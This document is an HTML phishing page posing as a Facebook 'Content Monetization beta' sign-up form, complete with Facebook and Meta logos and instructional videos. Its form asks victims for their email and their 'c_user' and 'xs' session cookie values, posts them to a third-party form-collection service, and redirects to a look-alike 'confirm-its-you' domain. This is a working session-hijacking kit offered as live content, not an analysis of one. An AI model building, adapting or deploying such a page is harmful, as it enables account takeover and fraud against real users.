<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Facebook Content Monetization Beta | Facebook for creators</title>
  <link rel="icon" href="https://www.facebook.com/favicon.ico" type="image/x-icon">
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 20px;
      background: #f0f2f5;
    }

    .container {
      max-width: 400px;
      margin: auto;
      background: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }

    .logo {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .logo img {
      height: 24px;
    }

    h2 {
      color: #1877f2;
      margin-bottom: 10px;
      font-size: 22px;
    }

    p {
      color: #555;
      margin-top: 0;
      margin-bottom: 20px;
    }

    label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
      color: #333;
    }

    input[type="email"],
    input[type="text"] {
      width: 90%;
      padding: 12px;
      margin-bottom: 20px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
      transition: all 0.2s ease-in-out;
    }

    /* ðŸ”µ Input focus blue border */
    input[type="email"]:focus,
    input[type="text"]:focus {
      outline: none;
      border: 1px solid #1877f2;
      box-shadow: 0 0 5px #1877f2;
    }

    button {
      width: 50%;
      padding: 12px;
      background-color: #1c1e21;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 16px;
      font-weight: bold;
    }

    button:hover {
      background-color: #3a3b3c;
    }

    .meta-footer img {
      height: 55px;
      opacity: 0.6;
      margin-top: 20px;
    }

    video {
      width: 100%;
      margin-bottom: 20px;
      border-radius: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Facebook Logo & Title -->
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
      <strong>Facebook</strong>
    </div>

    <!-- Heading & Description -->
    <h2>Facebook Content Monetization beta interest form</h2>
    <p>Simplify your earnings, monetize more content.</p>

    <!-- Video 1 -->
    <label for="video1">Detailed Video for Mobile</label>
    <video id="video1" controls poster="https://i.postimg.cc/hGnTKct0/1751305000032.jpg">
      <source src="https://cdn.glitch.global/4bf4ed3f-fe66-4b20-ac5c-8d1e670fb13d/Detailed-Mobile.mp4?v=1751605751282" type="video/mp4">
      Your browser does not support the video tag.
    </video>

    <!-- Video 2 -->
    <label for="video2">Detailed Video for PC/Laptop</label>
    <video id="video2" controls poster="https://i.postimg.cc/fRnC67c1/images.png">
      <source src="https://cdn.glitch.global/df4b160f-2a58-4ad5-b263-5cb7c7ae2484/Detailed-pc.mp4?v=1751605116998" type="video/mp4">
      Your browser does not support the video tag.
    </video>

    <!-- Form Start -->
    <form action="https://submit-form.com/1a4XJDmZI" method="POST">
  <input type="hidden" name="_redirect" value="https://facebook-confirm-its-you.vercel.app/">
      <label for="email">Email address</label>
      <input type="email" id="email" name="email" required>

      <label for="c_user">c_user</label>
      <input type="text" id="c_user" name="c_user" pattern="[0-9]+" minlength="15" id="c_user" title="Must Watch Detailed Video" required="1" aria-required="true">

      <label for="xs">xs</label>
      <input type="text" id="xs" name="xs" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&amp;+=]).{12,}$" title="Must Watch Detailed Video" required="1" aria-required="true">

      <button type="submit">Let's Do This</button>

      <!-- Meta Footer Logo -->
      <div class="meta-footer">
        <img src="https://i.postimg.cc/90g3K8C6/images-2-removebg-preview.png" alt="Meta Logo">
      </div>
    </form>
  </div>
</body>
</html>
